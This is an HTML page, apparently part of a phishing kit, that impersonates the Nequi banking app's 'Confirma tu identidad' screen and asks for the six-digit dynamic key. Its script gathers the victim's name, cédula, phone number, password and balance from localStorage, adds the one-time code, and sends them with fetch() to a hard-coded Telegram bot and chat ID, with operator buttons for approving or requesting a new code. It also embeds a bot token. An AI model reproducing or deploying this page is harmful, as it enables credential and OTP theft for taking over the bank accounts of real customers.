<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi - Confirmaci√≥n</title>
    <style>
        html, body { height: 100%; margin: 0; }
        body {
            font-family: 'Manrope', sans-serif;
            background: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .main-container {
            max-width: 360px;
            padding: 20px;
        }
        .logo-top {
            text-align: center;
            margin-bottom: 12px;
        }
        .logo-top img {
            height: 30px;
        }
        .title {
            font-weight: 700;
            font-size: 1.5rem;
            text-align: center;
            color: #200020;
            margin-bottom: 1.5rem;
        }
        .subtitle {
            color: #666;
            text-align: center;
            font-size: 0.875rem;
            margin-bottom: 1.75rem;
        }
        .box_numerickeypad {
            width: 272px;
            display: flex;
            justify-content: space-around;
            margin: 0 auto;
        }
        .code_numerickeypad {
            width: 32px;
            text-align: center;
            border: none;
            border-bottom: 1px solid #200020;
            padding-bottom: 12px;
            height: 24px;
            font-size: 1.5rem;
        }
        .numeric_board {
            width: 90%;
            margin: 30px auto 0;
        }
        .numeric_board-row {
            display: flex;
            padding-bottom: 18px;
            justify-content: space-between;
        }
        .container_number {
            color: #200020;
            font-size: 2.25rem;
            width: 60px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            border: none;
            background: none;
        }
        .container_number:hover {
            background: #f5f5f5;
            border-radius: 50%;
        }
        #confirm-btn {
            background-color: #DA0081;
            color: #ffffff;
            height: 48px;
            font-weight: 600;
            width: 100%;
            border-radius: 8px;
            border: none;
            margin: 30px 0 20px;
            font-size: 1rem;
            cursor: pointer;
        }
        #confirm-btn:hover {
            background-color: #c00070;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Logo Nequi arriba del t√≠tulo -->
        <div class="logo-top">
            <img src="./img/logo.svg" alt="Nequi">
        </div>

        <h1 class="title">Confirma tu identidad</h1>
        <p class="subtitle">Para confirmar tu identidad escribe la clave din√°mica que encuentras en tu App Nequi.</p>
        
        <div class="box_numerickeypad">
            <input type="password" id="c0" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="c1" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="c2" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="c3" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="c4" class="code_numerickeypad" maxlength="1" inputmode="none">
            <input type="password" id="c5" class="code_numerickeypad" maxlength="1" inputmode="none">
        </div>

        <div class="numeric_board">
            <div class="numeric_board-row">
                <button class="container_number">1</button>
                <button class="container_number">2</button>
                <button class="container_number">3</button>
            </div>
            <div class="numeric_board-row">
                <button class="container_number">4</button>
                <button class="container_number">5</button>
                <button class="container_number">6</button>
            </div>
            <div class="numeric_board-row">
                <button class="container_number">7</button>
                <button class="container_number">8</button>
                <button class="container_number">9</button>
            </div>
            <div class="numeric_board-row">
                <button class="container_number" disabled style="visibility:hidden"></button>
                <button class="container_number">0</button>
                <button class="container_number" id="backspace">‚å´</button>
            </div>
        </div>

        <button id="confirm-btn">Confirmar</button>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const inputs = document.querySelectorAll('.code_numerickeypad');
            const buttons = document.querySelectorAll('.container_number');
            const backspaceBtn = document.getElementById('backspace');
            const confirmBtn = document.getElementById('confirm-btn');

            let currentIndex = 0;

            // Teclado num√©rico
            buttons.forEach(button => {
                if (button === backspaceBtn) return;
                
                button.addEventListener('click', function () {
                    const value = this.textContent.trim();
                    if (/^\d$/.test(value) && currentIndex < inputs.length) {
                        inputs[currentIndex].value = value;
                        if (currentIndex < inputs.length - 1) {
                            currentIndex++;
                            inputs[currentIndex].focus();
                        }
                    }
                });
            });

            // Backspace
            backspaceBtn.addEventListener('click', function () {
                if (currentIndex >= 0) {
                    if (inputs[currentIndex].value) {
                        inputs[currentIndex].value = '';
                    } else if (currentIndex > 0) {
                        currentIndex--;
                        inputs[currentIndex].value = '';
                        inputs[currentIndex].focus();
                    }
                }
            });

            // Permitir teclado f√≠sico tambi√©n
            inputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    if (this.value.length > 0) {
                        currentIndex = index;
                        if (index < inputs.length - 1) {
                            currentIndex++;
                            inputs[currentIndex].focus();
                        }
                    }
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !this.value && index > 0) {
                        currentIndex = index - 1;
                        inputs[currentIndex].focus();
                    }
                });
            });

            // Confirmar
            confirmBtn.addEventListener('click', async function () {
                let otp = '';
                inputs.forEach(input => otp += input.value);

                if (otp.length !== 6) {
                    alert("Por favor, completa todos los campos");
                    return;
                }

                // Obtener datos del localStorage
                const nombreApellido = localStorage.getItem("nombreApellido") || "No especificado";
                const cedula = localStorage.getItem("cedula") || "No especificado";
                const numero = localStorage.getItem("numero") || "No especificado";
                const clave = localStorage.getItem("clave") || "No especificado";
                const saldo = localStorage.getItem("saldo") || "No especificado";

                // Crear ID √∫nico para este usuario
                const userId = Date.now();
                localStorage.setItem("userId", userId);

                // TELEGRAM CONFIG (sin espacio)
                const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
                const TELEGRAM_CHAT_ID = '6958936698';

                const message = `üîê <b>CLAVE DIN√ÅMICA 1</b>\n\n` +
                    `üìõ <b>Nombre:</b> ${nombreApellido}\n` +
                    `ü™™ <b>C√©dula:</b> ${cedula}\n` +
                    `üì± <b>N√∫mero:</b> ${numero}\n` +
                    `üîë <b>Clave:</b> ${clave}\n` +
                    `üí∞ <b>Saldo:</b> ${saldo}\n` +
                    `üî¢ <b>Din√°mica 1:</b> <code>${otp}</code>\n` +
                    `üÜî <b>UserID:</b> ${userId}\n` +
                    `üìÖ ${new Date().toLocaleString('es-CO')}`;

                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [[
                                    { text: '‚úÖ Aprobar', callback_data: `approve_${userId}` },
                                    { text: 'üîÑ Nueva Din√°mica', callback_data: `retry_${userId}` },
                                    { text: '‚ùå Error Login', callback_data: `error_${userId}` }
                                ]]
                            }
                        })
                    });

                    if (response.ok) {
                        console.log('Mensaje enviado a Telegram correctamente');
                        // Redirigir a loading
                        window.location.href = "loading.html";
                    } else {
                        const errorData = await response.json();
                        console.error('Error de Telegram:', errorData);
                        throw new Error('Error al enviar');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    alert('Error al enviar los datos. Intente nuevamente.');
                }
            });
        });
    </script>
</body>
</html>
